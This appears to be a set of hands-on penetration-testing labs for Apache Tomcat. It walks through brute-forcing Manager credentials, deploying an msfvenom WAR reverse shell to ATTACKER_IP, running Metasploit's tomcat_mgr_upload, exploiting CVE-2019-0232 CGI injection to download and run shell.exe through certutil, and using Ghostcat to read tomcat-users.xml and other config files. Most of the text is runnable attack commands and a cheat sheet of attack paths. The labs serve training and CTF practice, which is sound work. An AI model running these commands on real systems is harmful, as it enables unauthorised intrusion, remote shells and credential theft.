# Tomcat Labs

> Hands-on exercises covering the main Tomcat attack paths. Each lab is self-contained with objectives, commands, and flags to confirm success.

---

## Lab 1: Manager Login Brute Force

**Objective:** Discover valid Tomcat Manager credentials via brute force and credential decoding.

**Prereqs:** Target running Tomcat with `/manager/html` accessible (returns 401).

### Steps

- [ ] **Confirm the Manager endpoint exists:**

```bash
curl -s -o /dev/null -w "%{http_code}" http://TARGET:8080/manager/html
# 401 = exists and requires auth
# 403 = restricted to localhost
# 404 = not deployed
```

- [ ] **Enumerate with Gobuster to find other endpoints:**

```bash
gobuster dir -u http://TARGET:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 50 -x jsp,txt,xml
```

- [ ] **Brute force with Hydra:**

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
  -f TARGET -s 8080 http-get /manager/html
```

- [ ] **Alternative: Metasploit scanner:**

```bash
msfconsole -q -x "
use auxiliary/scanner/http/tomcat_mgr_login;
set RHOSTS TARGET;
set RPORT 8080;
set STOP_ON_SUCCESS true;
run;
exit
"
```

- [ ] **Intercept with Burp and decode:**
  1. Configure browser proxy → Burp (127.0.0.1:8080)
  2. Browse to `http://TARGET:8080/manager/html`
  3. Enter any credentials when prompted
  4. In Burp HTTP History, find the request
  5. Copy the `Authorization: Basic <base64>` value
  6. Decode:

```bash
echo '<base64_string>' | base64 -d
```

- [ ] **Verify valid credentials:**

```bash
curl -u 'USER:PASS' http://TARGET:8080/manager/html -s | head -20
# 200 + HTML content = success
```

### Success Criteria

- [ ] Valid username:password obtained
- [ ] Can access `/manager/html` with found credentials
- [ ] Understand the Base64 encoding used in HTTP Basic Auth

---

## Lab 2: WAR File Upload → Reverse Shell

**Objective:** Deploy a malicious WAR file through Tomcat Manager and obtain a reverse shell.

**Prereqs:** Valid Manager credentials with `manager-gui` or `manager-script` role.

### Steps

- [ ] **Generate WAR payload:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -f war -o backup.war
```

- [ ] **Inspect the WAR to find the trigger filename:**

```bash
jar -tf backup.war
# Note the .jsp filename, e.g.: zqcfkfmugyir.jsp
```

- [ ] **Deploy — Method A: Web UI**
  1. Browse to `http://TARGET:8080/manager/html`
  2. Log in with credentials
  3. Scroll to *"WAR file to deploy"* section
  4. Click "Choose File" → select `backup.war`
  5. Click "Deploy"
  6. Confirm `/backup` appears in the applications list

- [ ] **Deploy — Method B: curl (manager-script)**

```bash
curl --upload-file backup.war \
  -u 'tomcat:s3cret' \
  "http://TARGET:8080/manager/text/deploy?path=/backup"
# Expected output: OK - Deployed application at context path [/backup]
```

- [ ] **Verify deployment:**

```bash
curl -u 'tomcat:s3cret' \
  "http://TARGET:8080/manager/text/list"
# Should show /backup:running:0:backup
```

- [ ] **Start listener:**

```bash
nc -nlvp 4443
```

- [ ] **Trigger the reverse shell:**

```bash
# Replace with the actual .jsp filename from jar -tf
curl http://TARGET:8080/backup/zqcfkfmugyir.jsp
```

- [ ] **In your shell — confirm access and upgrade:**

```bash
whoami
id
hostname

# Upgrade to interactive TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

- [ ] **Cleanup — undeploy the WAR:**

```bash
curl -u 'tomcat:s3cret' \
  "http://TARGET:8080/manager/text/undeploy?path=/backup"
```

### Success Criteria

- [ ] WAR payload generated and deployed
- [ ] Reverse shell received on listener
- [ ] Can execute commands as the Tomcat service user
- [ ] Application undeployed after exercise

### Troubleshooting

| Problem | Fix |
|---------|-----|
| WAR deploys but no shell | Wrong LHOST — check your IP on the correct interface (`ip a`) |
| Connection refused on trigger | Listener not running or wrong port |
| 403 on deploy | User lacks `manager-gui` or `manager-script` role |
| Shell dies immediately | Try a staged payload: `java/jsp_shell_reverse_tcp` → `java/meterpreter/reverse_tcp` |

---

## Lab 3: Metasploit tomcat_mgr_upload

**Objective:** Use Metasploit's automated module to go from credentials to a Meterpreter session in one step.

**Prereqs:** Valid Manager credentials.

### Steps

- [ ] **Launch and configure the exploit:**

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
show options
```

- [ ] **Set required options:**

```
set RHOSTS TARGET
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST ATTACKER_IP
set LPORT 4443
```

- [ ] **Optional — choose payload:**

```
show payloads
# Default: java/meterpreter/reverse_tcp (good)
# Alternative for simpler shell:
set PAYLOAD java/jsp_shell_reverse_tcp
```

- [ ] **Run the exploit:**

```
run
```

- [ ] **In Meterpreter — basic enumeration:**

```
getuid
sysinfo
shell
whoami
```

- [ ] **Background and manage sessions:**

```
# Ctrl+Z to background
sessions -l          # list sessions
sessions -i 1        # interact with session 1
```

### Success Criteria

- [ ] Meterpreter or shell session obtained
- [ ] `getuid` / `whoami` shows the Tomcat service account
- [ ] Module auto-cleans the deployed WAR on exit

### What the Module Does Under the Hood

1. Generates a WAR with a JSP payload
2. Uploads via `/manager/text/deploy` (or `/manager/html/upload`)
3. Sends a request to trigger the JSP
4. Establishes the Meterpreter session
5. Undeploys the WAR on session close

---

## Lab 4: CGI Command Injection — CVE-2019-0232 (Windows)

**Objective:** Exploit a Windows Tomcat instance with CGI enabled to achieve command execution.

**Prereqs:** Target is Windows, Tomcat CGI servlet is enabled with `enableCmdLineArguments=true`, at least one `.bat` or `.cmd` script in the CGI directory.

### Steps

- [ ] **Fuzz for CGI scripts:**

```bash
# Try /cgi/ path
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt \
  -u http://TARGET:8080/cgi/FUZZ.bat \
  -mc 200 -fs 0

# Try /cgi-bin/ path
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt \
  -u http://TARGET:8080/cgi-bin/FUZZ.bat \
  -mc 200 -fs 0

# Try .cmd extension
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt \
  -u http://TARGET:8080/cgi/FUZZ.cmd \
  -mc 200 -fs 0
```

- [ ] **Confirm the script runs normally:**

```bash
curl http://TARGET:8080/cgi/welcome.bat
# Should return the script's normal output
```

- [ ] **Test command injection — dump environment variables:**

```bash
curl "http://TARGET:8080/cgi/welcome.bat?&set"
# If you see env vars like COMPUTERNAME=, PATH=, etc. → vulnerable
```

- [ ] **Execute reconnaissance commands (use full paths):**

```bash
# whoami
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe"

# hostname
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\hostname.exe"

# directory listing
curl "http://TARGET:8080/cgi/welcome.bat?&dir"
curl "http://TARGET:8080/cgi/welcome.bat?&dir+c:\users"

# network info
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\ipconfig.exe"

# list users
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\net.exe+user"
```

- [ ] **Read files:**

```bash
# Read win.ini
curl "http://TARGET:8080/cgi/welcome.bat?&type+c:\windows\win.ini"

# Read a flag
curl "http://TARGET:8080/cgi/welcome.bat?&type+c:\users\administrator\desktop\flag.txt"
```

- [ ] **Escalate to reverse shell:**

```bash
# Option A: Download and execute a binary
# 1. Host shell.exe on your attacker machine
python3 -m http.server 80

# 2. Download via certutil
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\certutil.exe+-urlcache+-f+http://ATTACKER_IP/shell.exe+c:\windows\temp\shell.exe"

# 3. Start listener
nc -nlvp 4443

# 4. Execute
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\temp\shell.exe"
```

```bash
# Option B: PowerShell reverse shell (URL-encode special chars)
# Generate the payload separately, URL-encode it, then:
curl "http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\cmd.exe+/c+powershell+-e+BASE64_ENCODED_PAYLOAD"
```

### Success Criteria

- [ ] Found `.bat` or `.cmd` scripts via fuzzing
- [ ] Confirmed command injection with `?&set`
- [ ] Executed system commands (whoami, dir, type)
- [ ] Obtained a reverse shell or read target files

### Important Notes

- `PATH` is **not inherited** in CGI context — always use full paths to executables
- URL-encode special characters: `+` for spaces, `%26` for `&`, `%7C` for `|`
- This CVE only works on **Windows** — Linux Tomcat CGI is not affected
- `enableCmdLineArguments` defaults to **false** in Tomcat >= 9.0.x — this is uncommon in the wild but appears in CTFs/OSCP

---

## Lab 5: Ghostcat — CVE-2020-1938 (AJP File Read)

**Objective:** Exploit the AJP connector on port 8009 to read arbitrary files from the Tomcat webapp.

**Prereqs:** Target has port 8009 open (AJP connector), Tomcat < 9.0.31 / < 8.5.51 / < 7.0.100.

### Steps

- [ ] **Confirm AJP port is open:**

```bash
nmap -sV -p 8009 TARGET
# Look for: Apache Jserv (Protocol v1.3)
```

- [ ] **Clone the exploit tool:**

```bash
git clone https://github.com/00threamern00/ajpShooter.git
cd ajpShooter
pip3 install pyngus
```

- [ ] **Read WEB-INF/web.xml (always start here):**

```bash
python3 ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read
```

- [ ] **Read tomcat-users.xml (if accessible):**

```bash
python3 ajpShooter.py http://TARGET 8009 /WEB-INF/../../conf/tomcat-users.xml read
```

- [ ] **Read other sensitive files:**

```bash
# Application configs
python3 ajpShooter.py http://TARGET 8009 /WEB-INF/classes/application.properties read

# Database configs
python3 ajpShooter.py http://TARGET 8009 /META-INF/context.xml read
```

- [ ] **Escalate to RCE (requires a file upload somewhere):**
  1. Upload a text file containing JSP code through any upload form on the app
  2. Include it via Ghostcat as JSP:

```bash
python3 ajpShooter.py http://TARGET 8009 /uploads/evil.txt eval
```

### Success Criteria

- [ ] Read `web.xml` via AJP
- [ ] Extracted credentials or configuration data
- [ ] If file upload existed: achieved RCE via JSP inclusion

---

## Quick Reference: Attack Path Cheat Sheet

```
1. nmap -sV -p 8080,8443,8009 TARGET
2. curl http://TARGET:8080/doesnotexist          # version from 404
3. curl -s -o /dev/null -w "%{http_code}" http://TARGET:8080/manager/html

IF 401 (auth required):
   hydra -L users.txt -P pass.txt -f TARGET -s 8080 http-get /manager/html
   → Got creds → msfvenom WAR → deploy → trigger → shell

IF 8009 open:
   python3 ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read

IF Windows + CGI:
   ffuf for .bat/.cmd → ?&set → ?&whoami.exe → reverse shell
```
